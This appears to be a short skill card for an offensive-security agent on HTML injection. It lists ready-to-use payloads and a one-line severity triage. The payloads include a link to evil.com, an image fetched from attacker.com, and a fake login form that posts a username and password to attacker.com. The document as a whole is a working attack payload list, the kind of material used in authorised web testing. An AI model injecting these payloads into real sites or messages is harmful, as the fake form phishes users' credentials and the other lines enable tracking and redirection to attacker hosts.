# SKILL: htmli
## Payloads
<h1>hello</h1>
<a href=http://evil.com>Click here</a>
<img src=http://attacker.com/x.png>
<form action="http://attacker.com" method="post"><input name="u"><input name="p" type="password"><button>Login</button></form>
## Triage
Reflected → Low. Email HTMLi → Med. → CSRF token theft → High.
